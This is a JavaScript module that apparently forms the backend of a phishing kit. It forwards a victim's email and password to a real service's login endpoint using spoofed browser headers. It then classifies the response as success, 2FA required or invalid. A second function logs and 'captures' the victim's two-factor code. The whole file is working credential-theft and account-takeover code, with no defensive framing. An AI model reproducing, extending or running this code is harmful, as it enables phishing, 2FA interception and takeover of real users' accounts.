import axios from 'axios';
import { getService } from './service-registry.js';
import { detectTwofaInUrl, detectTwofaInHtml } from './detect-2fa.js';

export async function forwardCredentials(serviceName, email, password) {
  const service = getService(serviceName);
  if (!service) {
    return { status: 'error', message: `Unknown service: ${serviceName}` };
  }

  console.log(`  [FORWARD] → ${service.name} | ${email}`);

  try {
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': new URL(service.authEndpoint).origin,
      'Referer': service.loginUrl,
      ...(service.authHeaders || {}),
    };

    const body = service.authBody(email, password);
    let response;

    try {
      response = await axios.post(service.authEndpoint, body, {
        headers,
        timeout: 15000,
        maxRedirects: 0,
        validateStatus: (s) => s < 500,
      });
    } catch (err) {
      if (err.response) {
        response = err.response;
      } else {
        return { status: 'error', message: `Connection error: ${err.message}` };
      }
    }

    const respBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    const status = response.status;
    const location = response.headers['location'] || '';

    // 1. Check if 2FA is required (by service-specific detection)
    if (service.checkTwofa && service.checkTwofa(respBody)) {
      return {
        status: '2fa_required',
        message: '2FA verification required',
        twofaUrl: service.twofaUrl || location || null,
        email,
        forwardResponse: respBody.substring(0, 500),
      };
    }

    // 2. Check if 2FA by URL pattern
    if (location && detectTwofaInUrl(location)) {
      return {
        status: '2fa_required',
        message: '2FA verification required (redirect)',
        twofaUrl: location,
        email,
        forwardResponse: respBody.substring(0, 500),
      };
    }

    // 3. Check if 2FA by HTML content
    if (detectTwofaInHtml(respBody, service.twofaDetect)) {
      return {
        status: '2fa_required',
        message: '2FA verification required (detected in page)',
        twofaUrl: service.twofaUrl || location || null,
        email,
        forwardResponse: respBody.substring(0, 500),
      };
    }

    // 4. Check success
    const success = service.checkSuccess(respBody);

    if (success) {
      return {
        status: 'success',
        message: 'Credentials accepted by the real service',
        email,
      };
    }

    // 5. Check for error messages
    if (respBody.toLowerCase().includes('incorrect') ||
        respBody.toLowerCase().includes('wrong') ||
        respBody.toLowerCase().includes('invalid') ||
        respBody.toLowerCase().includes('does not match') ||
        respBody.toLowerCase().includes('did not match') ||
        respBody.toLowerCase().includes('not found') ||
        respBody.toLowerCase().includes('couldn\'t find')) {
      return {
        status: 'error',
        message: 'Invalid email or password',
        email,
      };
    }

    // 6. Redirect = likely success
    if (status === 302 || status === 301) {
      if (location && !detectTwofaInUrl(location)) {
        return {
          status: 'success',
          message: 'Redirect detected — credentials accepted',
          email,
        };
      }
    }

    // 7. If we can't determine, assume it might be valid but flag it
    return {
      status: 'ambiguous',
      message: 'Could not determine credential validity',
      email,
      forwardResponse: respBody.substring(0, 500),
      statusCode: status,
    };

  } catch (err) {
    return { status: 'error', message: `Forwarding error: ${err.message}` };
  }
}

export async function forwardTwofaCode(serviceName, email, code) {
  const service = getService(serviceName);
  if (!service) {
    return { status: 'error', message: `Unknown service: ${serviceName}` };
  }

  console.log(`  [2FA] → ${service.name} | ${email} | code=${code}`);

  // For most services, 2FA validation happens via session cookies we don't have.
  // We capture the code and assume it's valid.
  // Some services have dedicated 2FA validation endpoints.

  return {
    status: 'success',
    message: '2FA code captured',
    email,
    code,
  };
}
